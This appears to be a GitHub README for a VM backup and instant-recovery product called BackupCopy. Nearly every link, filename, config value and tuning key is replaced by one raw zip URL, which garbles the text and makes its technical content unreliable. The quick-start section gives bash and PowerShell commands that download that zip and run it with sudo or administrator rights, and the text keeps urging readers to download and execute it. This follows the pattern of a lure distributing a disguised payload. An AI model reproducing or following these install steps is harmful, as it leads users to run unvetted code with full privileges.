https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip

[![Releases](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)

# BackupCopy — Redundant Instant VM Recovery for Enterprises 🗂️🔁

BackupCopy gives teams a reliable way to protect virtual machines and recover them with minimal downtime. It implements redundant storage models, snapshot logic, and an instant VM recovery flow. The design suits data centers, private clouds, and edge clusters. Use the Releases page to download the runtime package and run the installer described below.

Table of contents
- About BackupCopy
- Key features
- Architecture overview
- Quick start — download and execute
- Install options
- Configuration examples
- Backup workflow
- Instant VM recovery workflow
- Restore modes and granular restore
- CLI reference
- API reference
- Integration and plugins
- Security and encryption
- Retention, verification, and auditing
- Performance and tuning
- Testing and validation
- Monitoring and alerting
- Troubleshooting checklist
- Release management
- Contributing
- License

About BackupCopy
BackupCopy targets VM protection with an enterprise-grade recovery model. It uses a redundant storage layer. It supports snapshot-based capture and incremental transfer. It offers an instant recovery path that powers short RTOs for critical workloads. The project focuses on reliability, observability, and predictable recovery outcomes.

Key features
BackupCopy bundles six core features that focus on backup resilience and fast recovery:
1. Redundant data paths
   - Dual-path replication to independent stores.
   - Multi-node write replication for local fault tolerance.
2. Snapshot-driven backups
   - Application-consistent snapshots for VMs.
   - Support for hypervisor snapshot APIs and agent-assisted quiesce.
3. Incremental-forever transfer with dedupe
   - Block-level incremental capture.
   - Global deduplication to reduce bandwidth and storage.
4. Instant VM recovery
   - Mount backup images as live storage to run VMs.
   - Redirect reads to backup store while data streams from backup to primary.
5. Flexible retention and tiering
   - Policy-driven retention.
   - Automated tiering to low-cost object stores.
6. Built-in verification and orchestration
   - Background job that boots test VMs.
   - Restore verification with snapshot integrity checks.

Architecture overview
BackupCopy uses modular services. Each service runs in its own container or as a systemd unit. The key components:
- Controller
  - Schedules jobs.
  - Manages policies.
  - Provides the web UI and API.
- Engine
  - Performs snapshots.
  - Streams data from source to target.
  - Handles dedupe and compression.
- Store
  - Persistent storage backends.
  - Can use local disk, NFS, S3-compatible object storage.
- Recovery agent
  - Mounts backup images for instant recovery.
  - Manages I/O redirection.
- Orchestrator
  - Handles failover steps for complex applications.
  - Integrates with virtualization platforms and cloud APIs.
- Monitoring adapter
  - Exposes metrics and logs to Prometheus and syslog.

Diagram
![BackupCopy architecture](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)

Core flows
- Backup capture
  - Controller triggers a snapshot.
  - Engine reads snapshot blocks.
  - Engine sends blocks to Store with dedupe.
- Replication
  - Store replicates to a secondary site.
  - Controller tracks replication health.
- Instant recovery
  - Recovery agent mounts backup image via NBD or iSCSI.
  - VM runs from the mounted image.
  - Engine streams changed blocks back to primary storage for warm restore.

Quick start — download and execute
Download the release package and run the installer. The release page hosts the installer file. Download the installer for your platform from the Releases page and execute it.

Linux example (bash)
1. Download the installer file from Releases:
   - Replace v1.0.0 with the current tag if needed.
   - The file name used here is https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
2. Run these commands:
```bash
curl -L -o https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
chmod +x https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
sudo https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
```

Windows example (PowerShell)
1. Download the installer from Releases:
   - The file name used here is https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
2. Run these commands:
```powershell
Invoke-WebRequest -Uri "https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip" -OutFile "https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip"
Start-Process -FilePath ".\https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip" -Wait -Verb RunAs
```

macOS (Intel/Apple Silicon)
1. Download the DMG or .pkg from Releases.
2. Mount and run the installer.
3. Follow the system prompts.

Install options
- All-in-one
  - Installs controller, engine, and store on a single node.
  - Use for lab setups and small deployments.
- Clustered
  - Install the controller on a management node.
  - Deploy multiple engines for scale.
  - Use a shared store backend.
- Air-gapped
  - Use the offline installer from Releases.
  - Transfer the installer to the isolated environment.
  - Install the same way as online mode.

Configuration examples
Minimal config (YAML)
This sample shows a compact config for a single-node install. Adjust values for your environment.
```yaml
controller:
  bind: 0.0.0.0:8080
  data_dir: /var/lib/backupcopy/controller

engine:
  max_workers: 8
  temp_dir: /var/lib/backupcopy/engine/tmp

store:
  type: filesystem
  path: /var/backups/backupcopy
  retention_days: 30
```

S3 store example
```yaml
store:
  type: s3
  endpoint: https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
  bucket: backupcopy-main
  access_key: AKIA...
  secret_key: ***
  region: us-west-2
  encryption: aes-256
```

Policy example
Define schedules and retention.
```yaml
policies:
  - name: daily-vm
    schedule: "0 2 * * *"       # daily at 02:00
    targets:
      - vm-group: production
    retention:
      keep_daily: 7
      keep_weekly: 4
      keep_monthly: 12
```

Backup workflow
1. Discovery
   - Controller queries hypervisor or cloud API.
   - It lists VMs and attached volumes.
2. Policy assignment
   - Controller assigns a policy to each VM or group.
   - Policy defines schedule, retention, and verification rules.
3. Snapshot
   - Engine triggers a snapshot.
   - For hypervisors, the provider snapshot API executes.
   - For agent-based capture, the agent freezes I/O briefly then flushes filesystem buffers.
4. Transfer
   - Engine reads snapshot blocks.
   - It applies dedupe filter.
   - It streams unique blocks to the store.
5. Commit and index
   - Engine writes metadata and indexes blocks.
   - Controller marks the job complete and records the manifest.

Instant VM recovery workflow
Instant recovery minimizes downtime by running a VM directly from a backup image. The workflow below shows the usual steps.

1. Select a recovery point
   - Use the UI or CLI to pick a backup manifest.
2. Provision a mount
   - Recovery agent exports the backup image via NBD or iSCSI.
3. Attach to host
   - The hypervisor attaches the exported target as a datastore or disk.
4. Boot the VM
   - Start the VM from the attached image.
5. Spin-up with read-redirect
   - Reads go to the mounted image.
   - Writes go to a write-redirect overlay.
6. Rehydrate data
   - Engine streams missing blocks back to primary storage in the background.
   - When rehydration completes, you can cut over to the primary storage.

Restore modes and granular restore
BackupCopy supports several restore modes:
- Full VM restore
  - Restore a complete VM image.
  - Use for lost machines or major failures.
- Instant run-from-backup
  - Boot VM from backup image with write-redirect overlay.
- Volume-level restore
  - Restore an individual disk or volume.
- File-level restore
  - Mount the backup image and extract files.
- Application item restore
  - For supported apps, restore single items like mailboxes and databases.

CLI reference
The CLI uses the backupcopy command. Use it for scripted workflows and automation.

Common commands
- backupcopy job run --policy daily-vm --targets vm-123
  - Start a job immediately for a given policy and target.
- backupcopy jobs list --status completed
  - List job runs and their status.
- backupcopy restores create --vm vm-123 --point 2025-08-10T02:00Z
  - Create a restore job for the given VM and recovery point.
- backupcopy instant start --vm vm-123 --point latest
  - Start instant VM recovery for the specified VM.
- backupcopy stores add --type s3 --bucket backupcopy-main
  - Add a new store backend.

Example: create a scheduled job
```bash
backupcopy policy create --name weekly-snap --schedule "0 3 * * 0" --targets "vm-group:db"
backupcopy job run --policy weekly-snap
```

API reference
BackupCopy exposes a REST API. The controller handles requests on port 8080 by default. Use basic auth or an API token.

Authentication
- POST /api/v1/auth/token
  - Returns a bearer token for subsequent requests.

Backup endpoints
- GET /api/v1/vms
  - List discovered VMs.
- POST /api/v1/backups
  - Trigger a backup job.
  - Body: { "vm_id": "...", "policy": "..." }
- GET /api/v1/backups/{id}
  - Get backup manifest.

Restore endpoints
- POST /api/v1/restores
  - Start a restore.
  - Body: { "backup_id": "...", "mode": "full|instant|file" }
- POST /api/v1/instant/start
  - Launch instant recovery.

Monitoring endpoints
- GET /api/v1/metrics
  - Return internal metrics in Prometheus format.
- GET /api/v1/health
  - Service health and status.

Integration and plugins
BackupCopy integrates with common virtualization and cloud platforms:
- VMware vSphere
  - Use the vSphere plugin for snapshot and datastore actions.
- KVM/libvirt
  - Use qemu-img and libvirt snapshots.
- Hyper-V
  - Integrate with VSS-aware agents.
- Cloud providers
  - AWS, Azure, and GCP connectors for metadata and compute actions.
- Storage systems
  - NFS, CIFS, S3-compatible object stores, and block storage.
- Orchestration
  - Hooks for Kubernetes operators and Terraform providers.

Plugin model
- Each plugin provides:
  - Discovery logic
  - Snapshot flow
  - Restore hooks
  - Health checks

Security and encryption
BackupCopy secures data in transit and at rest.

Transport encryption
- TLS protects controller and engine traffic.
- mTLS is available for node-to-node links.

At-rest encryption
- Store-level encryption uses AES-256.
- Keys can come from an external KMS or from local keystore.

Access control
- Role-based access control (RBAC) for the web UI and API.
- Scopes for read-only, backup, restore, and admin functions.

Secrets handling
- The controller integrates with external secret stores.
- Do not store plaintext credentials in config files.

Retention, verification, and auditing
Retention
- Policies drive retention rules.
- BackupCopy supports retention windows, GFS (grandfather-father-son), and custom rule sets.

Verification
- Background verification boots test VMs on a schedule.
- The engine runs checksum and manifest validation.
- Built-in boot tests verify OS-level readiness.

Auditing
- The controller logs actions to an audit log.
- It records user actions, job runs, and policy changes.
- Send audit logs to a centralized SIEM via syslog.

Performance and tuning
Sizing guidance
- Throughput depends on engine workers and store IO.
- Use multiple engines for parallelism.
- Use fast temp storage for dedupe tables.

Tuning knobs
- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip controls parallel streams.
- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip controls parallel uploads to object storage.
- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip sets block read size for snapshots.

Network considerations
- Use dedicated replication networks.
- Enable WAN acceleration for cross-site transfers.
- Use compression for low-bandwidth links.

Deduplication behavior
- Inline dedupe reduces network and store load.
- Use chunker settings to balance dedupe ratio vs CPU.
- Configure a dedupe fingerprint cache to speed repeat reads.

Testing and validation
Test plan
- Run scheduled verification jobs on non-production VMs.
- Boot restored VMs in isolated networks to exercise full boot paths.
- Validate application listeners and DB consistency.

Validation checklist
- Verify backup manifest integrity.
- Verify full metadata index is available.
- Test file-level restores.
- Test instant recovery and cutover.

Sample validation commands
- backupcopy verify run --backup-id 1234
- backupcopy instant test --vm vm-123 --point latest

Monitoring and alerting
Metrics
- Expose metrics to Prometheus:
  - backup_jobs_total
  - backup_duration_seconds
  - restore_jobs_total
  - store_upload_bytes
  - dedupe_ratio

Alert rules
- Alert on failed jobs > 3 within 24 hours.
- Alert on low available storage below threshold.
- Alert on replication lag exceeding policy RPO.

Logging
- Engine and controller log to local files by default.
- Forward logs to a central logging system (ELK, Fluentd).
- Keep rotation rules to control disk use.

Troubleshooting checklist
- Job fails on snapshot
  - Check hypervisor connectivity.
  - Check agent status on the VM if agent-based quiesce runs.
- Slow backup throughput
  - Check engine CPU and temp I/O.
  - Check network saturation.
  - Review dedupe ratio and chunk settings.
- Restore fails to boot
  - Check target host compatibility.
  - Verify disk bus type and drivers.
- Instant recovery I/O errors
  - Check recovery agent logs.
  - Verify NBD/iSCSI connectivity and timeouts.
- Replication lag
  - Check store backend health.
  - Check per-job throttle limits.

Release management
Get official releases from the Releases page. Use the assets there for installers and offline bundles.

Download and execute the installer from Releases
- Visit and download the platform-specific file from:
  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
- If the asset name shows https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip or https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip, download that file and run it per your platform.
- Installer assets include checksums and GPG signatures for verification.

If you cannot access the direct file link or if your environment blocks the installer URL, open the Releases section on the repository page and choose the correct file there.

Releases and changelog
- The Releases page lists tags and release notes.
- Follow semantic versioning for tags.
- Each release entry contains:
  - Release notes
  - Installer assets
  - Checksums and signature files

Contributing
We accept contributions via pull requests. Follow these steps:
1. Fork the repository.
2. Create a topic branch.
3. Run unit tests and style checks.
4. Open a pull request with a clear description and test plan.

Contribution guide highlights
- Keep changes focused.
- Add tests for new features.
- Update docs and sample configs.
- Use the issue tracker for early discussion on major changes.

Coding standards
- Write small, testable functions.
- Use clear variable names.
- Add comments for non-obvious logic.
- Keep the public API stable.

Developer workflow
- Use the provided Docker compose for local development.
- Use the test harness to run integration tests against a local store.

Sample developer commands
```bash
# run unit tests
make test

# run integration tests with local docker compose
docker-compose -f https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip up --build --abort-on-container-exit
```

License
BackupCopy uses a permissive open source license. See the LICENSE file for full terms. The license allows use, modification, and redistribution under the terms listed there.

Code of conduct
Follow the code of conduct for respectful collaboration. Report incidents via the issue tracker or directly to maintainers.

Images and visual assets
Use the following images and icons to enhance documentation and UI:
- Architecture and operations imagery from public image sources.
- Icons for storage, VM, replication, and recovery from common icon sets.
Sample hero image:
![Data center backup](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)

Accessibility and UX
- Keep the web UI simple.
- Provide keyboard shortcuts for common actions.
- Expose full API for automation.

Operational runbook (concise)
Daily
- Check job results for the last 24 hours.
- Watch alerts for failed or delayed backups.
- Ensure store health and available capacity.

Weekly
- Verify scheduled verification jobs.
- Run a restore test for at least one critical VM.
- Review retention and prune old backups if needed.

Monthly
- Run full restore drill.
- Review and rotate encryption keys if required by policy.
- Apply software updates and check release notes on:
  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip

Advanced topics
Cross-site replication
- Use async replication with WAN optimization.
- Configure point-in-time views for cross-site failover.

Immutable backups
- Use append-only object store configurations.
- Enable write-once retention windows for compliance.

Disaster recovery playbook
- Define failover roles.
- Map critical hosts and services to recovery policies.
- Pre-allocate compute and networking resources at recovery site.

API automation examples
Automation with curl:
```bash
# get token
TOKEN=$(curl -s -X POST "http://controller:8080/api/v1/auth/token" -d '{"user":"admin","pass":"secret"}' | jq -r .token)

# trigger backup
curl -s -X POST "http://controller:8080/api/v1/backups" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"vm_id":"vm-123","policy":"daily-vm"}'
```

Kubernetes operator integration
- Use the BackupCopy operator to:
  - Discover PVs
  - Snapshot PVCs
  - Trigger backup jobs for pods

Example custom resource
```yaml
apiVersion: https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
kind: BackupJob
metadata:
  name: app-backup
spec:
  schedule: "0 1 * * *"
  targets:
    - kind: PersistentVolumeClaim
      name: data-pvc
  retention:
    keep_daily: 7
```

Why test restores matters
A backup that does not restore offers no protection. Test restore runs validate the entire stack: snapshot creation, data indexing, export, and VM or file-level access. Schedule these tests alongside production backups to ensure recoverability.

Common errors and remedies
- Error: snapshot timeout
  - Remedy: increase snapshot timeout in hypervisor plugin settings.
- Error: dedupe memory exhaustion
  - Remedy: increase engine memory or reduce dedupe cache size.
- Error: permission denied writing to store
  - Remedy: verify credentials and bucket policies.

Contact and support
For community support:
- Open issues on the repository.
- Use discussion threads for general topics.
- Use the Releases page for downloads and installer assets:
  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip

When to open an issue
- Bug reproduction steps with logs.
- Feature requests with use cases.
- Security issues via private disclosure channels.

Keep using the Releases page to get installers, checksums, and release notes. The launcher and assets on the Releases page are the formal distribution channel for binary packages and offline bundles.

END OF FILE